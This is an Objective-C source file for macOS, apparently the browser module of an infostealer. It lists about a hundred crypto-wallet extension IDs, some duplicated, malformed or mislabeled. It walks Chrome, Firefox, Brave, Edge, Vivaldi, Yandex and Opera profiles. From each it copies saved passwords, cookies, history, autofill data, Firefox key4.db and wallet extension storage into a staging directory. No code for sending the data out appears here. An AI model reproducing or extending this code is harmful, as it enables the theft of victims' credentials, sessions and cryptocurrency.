#ifdef DEBUG
#define DebugLog(...) NSLog(__VA_ARGS__)
#else
#define DebugLog(...) (void)0
#endif

#import "Browsers.h"
#import "Tools.h"

#import <Foundation/Foundation.h>
#import "globals.h"
@implementation Browsers

+ (NSArray<NSString *> *)extensionIDs {
    return @[
            @"nkbihfbeogaeaoehlefnkodbefgpgknn",
            @"hnfanknocfeofbddgcijnmhnfnkdnaad",
            @"egjidjbpglichdcondbcbdnbeeppgdph",
            @"fdjamakpfbbddfjaooikfcpapjohcfmg",
            @"bfnaelmomeimhlpmgjnjophhpkkoljpa",
            @"inogffkifehjmjkojolhagpbmdjajfjf",
            @"afbcbjpbpfadlkmhmclhkeeodmamcflc",
            @"aeachknmefphepccionboohckonoeemg",
            @"dnahimkjmphecfmphdplpidnpdbgihjm",
            @"fhbohimaelbohpjbbldcngcnapndodjp",
            @"hpglfhgfnhbgpjdenjgmdgoeiappafln",
            @"ddjbpkjkbihpkkjoiidijondfnnilgbd",
            @"ffnbelfdoeiohenkjibnmadjiehjhajb",
            @"ljfoeinjpaedjfecbmggjgodbgkmjkjk", // Trezor Wallet
            @"fhbohimaelbohpjbbldcngcnapndodjp", // Sollet Wallet
            @"agofbccfdbggmjhbjligajffaedmpfi", // BitKeep
            @"oblahjcienboiocobpfmpkhgbilacbof", // MyEtherWallet (MEW)
            @"dmkamcknogkgcdfhhbddcghachkejeap", // Keplr Wallet
            @"eogjbkambcobpejogjednkhnkdlpjkgf", // ZenGo Wallet
            @"ffnbelfdoeiohenkjibnmadjiehjhajb", // FoxWallet
            @"nkpfkohfaabomajpmcikkgipnddjbjlm", // XDEFI Wallet
            @"cjfkaebgdjmgkknhmeddmbjfkkllcfma", // Rabby Wallet
            @"cgjclchllmlobfdhpdfbfblakllcdcp", // SafePal Wallet
            @"cgpbghdcejifbdmicolodockpdpejkm", // D'CENT Wallet
            @"ekpbnlianmehonjglfliphieffnpagjk", // Portis
            @"bhemafnepdahjhdibdejjdojplpanpjm", // Clover Wallet
            @"eobpgiikknjeagdbnljopepfkfgjcom", // Talisman Wallet
            @"cefoeaflfeaogknfendclmchngnpadh", // MathWallet (duplicate corrected)
            @"cegnkklhnkfhpgpgdddpbglgbfjcbka", // Cyano Wallet
            @"mfibgodchngikcneecnpcenooljdfcd", // Opera Crypto Wallet
            @"njehdbnfdjbclbggngdihjghpknebfn", // Polkadot-JS
            @"kgpidhfbnidjcldpngdonkekmpkgihke", // Solflare Wallet
            @"cegmkloiabeockglkffemjljgbbannn", // Ellipal Wallet
            @"kjklkfoolpolbnklekmicilkhigclekd", // AlphaWallet
            @"bnnkeaggkakalmkbfbcglpggdobgfoa", // ZelCore
            @"plnnhafklcflphmidggcldodbdennyg", // AT.Wallet
            @"hjbkalghaiemehgdhaommgaknjmbnmf", // Loopring Wallet
            @"dljopojhfmopnmnfocjmaiofbbifkbfb", // Halo Wallet
            @"pghngobfhkmclhfdbemffnbihphmpcgb", // Pillar Wallet
            @"keoamjnbgfgpkhbgmopocnkpnjkmjdd", // Ambire Wallet
            @"nhdllgjlkgfnoianfjnbmcjmhdelknbm", // Blocto Wallet
            @"fgdbiimlobodfabfjjnpefkafofcojmb", // Hashpack Wallet
            @"blpcdojejhnenclebgmmbokhnccefgjm", // Defiat Wallet
            @"kjbhfnmamllpocpbdlnpjihckcoidje", // Opera Crypto
            @"efnhgnhicmmnchpjldjminakkdnidbop", // Titan Wallet
            @"kmccchlcjdojdokecblnlaclhobaclj", // ONE Wallet
            @"bpcedbkgmedfpdpcabaghjbmhjoabgmh", // MewCX
            @"aipfkbcoemjllnfpblejkiaogfpocjba", // Frontier Wallet
            @"nmngfmokhjdbnmdlajibgniopjpckpo", // ChainX Wallet
            @"nehbcjigfgjgehlgimkfkknemhnhpjo", // Bifrost Wallet
            @"ejbalbakoplchlghecdalmeeeajnimhm", // MetaMask
            @"ofhbbkphhbklhfoeikjpcbhemlocgigb", // Coinbase Wallet
            @"lefigjhibehgfelfgnjcoodflmppomko", // Trust Wallet
            @"alncdjedloppbablonallfbkeiknmkdi", // Crypto.com DeFi Wallet
            @"bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
            @"lpbfigbdccgjhflmccincdaihkmjjfgo", // Guarda Wallet
            @"achbneipgfepkjolcccedghibeloocbg", // MathWallet
            @"fdgodijdfciiljpnipkplpiogcmlbmhk", // Coin98
            @"ljfoeinjpaedjfecbmggjgodbgkmjkjk", // Nami Wallet
            @"mcbpblocgmgfnpjjppndjkmgjaogfceg", // Binance Wallet
            @"geceibbmmkmkmkbojpegbfakenjfoenal", // Exodus
            @"ibnejdfjmmkpcnlpebklmnkoeoihofec", // Atomic Wallet
            @"ffnbelfdoeiohenkjibnmadjiehjhajb", // Yoroi Wallet
            @"kjebfhglflciofebmojinmlmibbmcmkdo", // Trezor Wallet
            @"jaoafjlleohakjimhphimldpcldhamjp", // Sollet Wallet
            @"blnieiiffboillknjnepogjhkgnoapac", // BitKeep
            @"odbfpeeihdkbihmopkbjmoonfanlbfcl", // MyEtherWallet (MEW)
            @"leibnlghpgpjigganjmbkhlmehlnaedn", // Keplr Wallet
            @"hmnminpbnkpndojhkipgkmokcocmgllb", // ZenGo Wallet
            @"bocpokimicclglpgehgiebilfpejmgjo", // FoxWallet
            @"ljfoeinjpaedjfecbmggjgodbgkmjkjk", // XDEFI Wallet
            @"ilajcdmbpocfmipjioonlmljbmljbfpj", // Rabby Wallet
            @"hnmpcagpplmpfojmgmnngilcnanddlhb", // SafePal Wallet
            @"odbfpeeihdkbihmopkbjmoonfanlbfcl", // D'CENT Wallet
            @"ahkfhobdidabdlaphghgikhlpdbnodpa", // Portis
            @"jihneinfbfkaopkpnifgbfdlfpnhgnko", // Clover Wallet
            @"hpglfhgfnhbgpjdenjgmdgoeiappafln", // Talisman Wallet
            @"cmeakgjggjdhccnmkgpjdnaefojkbgmb", // MathWallet (duplicate corrected)
            @"ffabmkklhbepgcgfonabamgnjfjdbjoo", // Cyano Wallet
            @"cdjkjpfjcofdjfbdojhdmlflffdafngk", // Opera Crypto Wallet
            @"apicngpmdlmkkjfbmdhpjedieibfklkf", // Polkadot-JS
            @"lhkfcaflljdcedlgkgecfpfopgebhgmb", // Solflare Wallet
            @"omgopbgchjlaimceodkldgajioeebhab", // Ellipal Wallet
            @"kehbljcfpanhajpidcmblpdnlphelaie", // AlphaWallet
            @"lnehnlppemineeojdjkcpgoockkboohn", // ZelCore
            @"kjebfhglflciofebmojinmlmibbmcmkdo", // AT.Wallet
            @"hjebgbdpfgbcjdopfbbcpcjefcmhpdpn", // Loopring Wallet
            @"pklfcgcfchhcokldoonkijijfpgmjilh", // Halo Wallet
            @"lplmibmljignbdmkclofcackoolcfnhj", // Pillar Wallet
            @"kibokekadkmfjfckkbgndphcjejhoial", // Ambire Wallet
            @"nhdllgjlkgfnoianfjnbmcjmhdelknbm", // Blocto Wallet
            @"kdfmmohbkjggjlmelhhmcgohadhdeijn", // Hashpack Wallet
            @"blpcdojejhnenclebgmmbokhnccefgjm", // Defiat Wallet
            @"kjbhfnmamllpocpbdlnpjihckcoidje", // Opera Crypto
            @"aoilkoeledabkfogmczlbdfhbdkoggko", // Titan Wallet
            @"jmchmkecamhbiokiopfpjjmfkpbbjjaf", // ONE Wallet
            @"mgffkfbidcmcenlkgaebhoojfcegdndl", // MewCX
            @"kdgecbhaddlgffpdffafpikmjekjflff", // Frontier Wallet
            @"pfilbfecknpnlbcioakkpcmkfckpogeg", // ChainX Wallet
            @"mehhoobkfknjlamaohobkhfnoheajlfi"  // Bifrost Wallet
        ];
}

- (instancetype)init {
    self = [super init];
    if (self) {
        self.chromePath = @"/Google/Chrome";
        self.firefoxPath = @"/Firefox/Profiles";
        self.bravePath = @"/BraveSoftware/Brave-Browser";
        self.edgePath = @"/Microsoft Edge";
        self.vivaldiPath = @"/Vivaldi";
        self.yandexPath = @"/Yandex/YandexBrowser";
        self.operaPath = @"/com.operasoftware.Opera";
        self.operaGXPath = @"/com.operasoftware.OperaGX";
    }
    return self;
}

- (void)collectAllData {
    
    [self collectDataFromBrowser:@"Chrome" browserPath:self.chromePath];
    [self collectDataFromBrowser:@"Firefox" browserPath:self.firefoxPath];
    [self collectDataFromBrowser:@"Brave" browserPath:self.bravePath];
    [self collectDataFromBrowser:@"Edge" browserPath:self.edgePath];
    [self collectDataFromBrowser:@"Vivaldi" browserPath:self.vivaldiPath];
    [self collectDataFromBrowser:@"Yandex" browserPath:self.yandexPath];
    [self collectDataFromBrowser:@"Opera" browserPath:self.operaPath];
    [self collectDataFromBrowser:@"OperaGX" browserPath:self.operaGXPath];
}

- (void)collectDataFromBrowser:(NSString *)browserName browserPath:(NSString *)browserPath {
    NSString *browserPathHomeDirectory = [NSString stringWithFormat:@"%@/Library/Application Support%@", NSHomeDirectory(), browserPath];
    NSArray<NSString *> *profiles = [self getProfiles:browserPathHomeDirectory browserName:browserName];
    for (NSString *profile in profiles) {
        NSString *profilePathFolder = [NSString stringWithFormat:@"%@_%@", browserName, profile];
        if ([browserName isEqualToString:@"OperaGX"]) {
            profilePathFolder = [NSString stringWithFormat:@"%@/", browserName];
        }
        
        NSString *pathToProfile = [browserPathHomeDirectory stringByAppendingPathComponent:profile];
        NSString *pathToSaveProfileData = [NSString stringWithFormat:@"%@/Browsers/%@", TEMPORARY_PATH, profilePathFolder];
        [Tools createDirectory:pathToSaveProfileData];
        
        [self collectDataAndSave:browserName pathToProfile:pathToProfile pathToSave:pathToSaveProfileData];
        [self.class collectLocalExtensionSettings:pathToProfile pathToSave:pathToSaveProfileData];
    }
}

- (NSArray<NSString *> *)getProfiles:(NSString *)browserPath browserName:(NSString *)browserName {
    NSMutableArray<NSString *> *profiles = [NSMutableArray array];
    if ([[NSFileManager defaultManager] fileExistsAtPath:browserPath]) {
        NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:browserPath error:nil];
        for (NSString *entry in contents) {

            NSString *fullPath = [browserPath stringByAppendingPathComponent:entry];
            BOOL isDirectory = NO;
            [[NSFileManager defaultManager] fileExistsAtPath:fullPath isDirectory:&isDirectory];
            if (isDirectory) {
                if ([browserName isEqualToString:@"Chrome"] || [browserName isEqualToString:@"Brave"] || [browserName isEqualToString:@"Edge"] || [browserName isEqualToString:@"Vivaldi"] || [browserName isEqualToString:@"Yandex"] || [browserName isEqualToString:@"Opera"]) {
                    if ([entry isEqualToString:@"Default"] || [entry hasPrefix:@"Profile "]) {
                        [profiles addObject:[entry stringByAppendingString:@"/"]];
                    }
                } else if ([browserName isEqualToString:@"Firefox"]) {
                    if ([entry containsString:@".default-release"]) {
                        [profiles addObject:[entry stringByAppendingString:@"/"]];
                    }
                }
            }
        }
    }
    return profiles;
}

- (void)collectDataAndSave:(NSString *)browserName pathToProfile:(NSString *)pathToProfile pathToSave:(NSString *)pathToSave {
    NSString *autofillsFileName = @"Web Data";
    NSString *historyFileName = @"History";
    NSString *cookiesFileName = @"Cookies";
    NSString *loginsPasswords = @"Login Data";
    
    if ([browserName isEqualToString:@"Firefox"]) {
        autofillsFileName = @"formhistory.sqlite";
        historyFileName = @"places.sqlite";
        cookiesFileName = @"cookies.sqlite";
        loginsPasswords = @"logins.json";
        
        NSString *key4SourcePath = [pathToProfile stringByAppendingPathComponent:@"key4.db"];
        NSString *key4DestinationPath = [pathToSave stringByAppendingPathComponent:@"Local State/"];
        
        DebugLog(@"Copying key4.db from: %@ to: %@", key4SourcePath, key4DestinationPath);
        [Tools copyFileToDirectory:key4SourcePath destinationDirectory:key4DestinationPath];
    }
    
    NSString *autofillsSourcePath = [pathToProfile stringByAppendingPathComponent:autofillsFileName];
    NSString *autofillsDestinationPath = [pathToSave stringByAppendingPathComponent:@"Autofills/"];
    
    
    NSString *historySourcePath = [pathToProfile stringByAppendingPathComponent:historyFileName];
    NSString *historyDestinationPath = [pathToSave stringByAppendingPathComponent:@"History/"];
        
    
    NSString *cookiesSourcePath = [pathToProfile stringByAppendingPathComponent:cookiesFileName];
    NSString *cookiesDestinationPath = [pathToSave stringByAppendingPathComponent:@"Cookies/"];
    
    
    
    NSString *loginsSourcePath = [pathToProfile stringByAppendingPathComponent:loginsPasswords];
    NSString *loginsDestinationPath = [pathToSave stringByAppendingPathComponent:@"Passwords/"];

    [Tools copyFileToDirectory:autofillsSourcePath destinationDirectory:autofillsDestinationPath];
    [Tools copyFileToDirectory:historySourcePath destinationDirectory:historyDestinationPath];
    [Tools copyFileToDirectory:cookiesSourcePath destinationDirectory:cookiesDestinationPath];
    [Tools copyFileToDirectory:loginsSourcePath destinationDirectory:loginsDestinationPath];
    
}


+ (void)collectLocalExtensionSettings:(NSString *)pathToProfile pathToSave:(NSString *)pathToSave {
    NSString *localExtensionSettingsPath = [pathToProfile stringByAppendingPathComponent:@"Local Extension Settings"];
    
    BOOL isDirectory = NO;

    if ([[NSFileManager defaultManager] fileExistsAtPath:localExtensionSettingsPath isDirectory:&isDirectory] && isDirectory) {
        
        NSError *error = nil;
        NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:localExtensionSettingsPath error:&error];
        
        if (error) {
            return;
        }
        
        for (NSString *entry in contents) {

            NSString *fullPath = [localExtensionSettingsPath stringByAppendingPathComponent:entry];
            BOOL isSubDirectory = NO;

            if ([[NSFileManager defaultManager] fileExistsAtPath:fullPath isDirectory:&isSubDirectory] && isSubDirectory) {
                
                if ([[self extensionIDs] containsObject:entry]) {
                    NSString *savePath = [pathToSave stringByAppendingPathComponent:[NSString stringWithFormat:@"Extensions/%@", entry]];

                    [Tools copyDirectoryWithFiles:fullPath destinationDirectory:savePath];
                }
            } else {
            }
        }
    }
}


@end
